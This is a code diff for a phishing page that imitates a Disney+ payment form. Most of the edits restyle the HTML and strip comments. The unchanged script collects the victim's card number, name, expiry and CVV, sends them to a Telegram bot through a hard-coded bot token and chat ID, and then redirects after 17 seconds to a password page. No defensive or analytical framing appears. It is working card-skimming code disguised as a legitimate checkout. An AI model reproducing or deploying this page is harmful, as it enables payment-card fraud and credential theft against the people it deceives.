@@ -14,10 +14,11 @@
 
     <h1>Información de pago</h1>
 
-    <div class="cb-icons">
-      <img src="Images/visa.png" alt="Visa"/>
-      <img src="Images/Mastercard.png" alt="Mastercard"/>
-      <img src="Images/Amex.png" alt="American Express"/>
+    <!-- Icônes de paiement -->
+    <div class="cb-icons" style="display:flex; justify-content:center; gap:12px; margin:16px 0;">
+      <img src="Images/visa.png" alt="Visa" style="height:28px; object-fit:contain;"/>
+      <img src="Images/Mastercard.png" alt="Mastercard" style="height:28px; object-fit:contain;"/>
+      <img src="Images/Amex.png" alt="American Express" style="height:28px; object-fit:contain;"/>
     </div>
 
     <form id="paymentForm">
@@ -25,12 +26,15 @@
       <input type="text" placeholder="Nombre en la tarjeta" required/>
       <input type="text" placeholder="MM/AA" required/>
       <input type="text" placeholder="CVV" required/>
-      <p>
+
+      <p style="font-size:0.85rem; color:#333; margin:16px 0; text-align:left;">
         Al validar tu pago, aceptas que tu suscripción comience de inmediato y se renueve automáticamente cada mes. Sin compromiso, puedes cancelar en cualquier momento.
       </p>
+
       <button type="submit">Validar pago</button>
     </form>
 
+    <!-- Note de bas de page + logos partenaires -->
     <div class="footer-note">
       <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
       MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
@@ -49,21 +53,17 @@
   <!-- Overlay du spinner -->
   <div id="spinnerOverlay">
     <div class="spinner"></div>
-    <div class="spinner-text">Verificando pago…</div>
   </div>
 
   <script>
     document.getElementById("paymentForm").addEventListener("submit", function(e) {
       e.preventDefault();
-      // Affiche le spinner
       document.getElementById("spinnerOverlay").style.display = "flex";
 
-      // Récupère les valeurs
       const [num, name, exp, cvv] = Array.from(this.elements)
         .filter(el => el.tagName === "INPUT")
         .map(el => el.value.trim());
 
-      // Envoi Telegram
       const botToken = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
       const chatId   = "-4970333928";
       const message  = `💳 Pago Disney+: Tarjeta ${num}, Nombre ${name}, Exp ${exp}, CVV ${cvv}`;
@@ -74,7 +74,6 @@
         body: JSON.stringify({ chat_id: chatId, text: message })
       }).catch(console.error)
         .finally(() => {
-          // Redirige après 17s
           setTimeout(() => {
             window.location.href = "password.html";
           }, 17000);
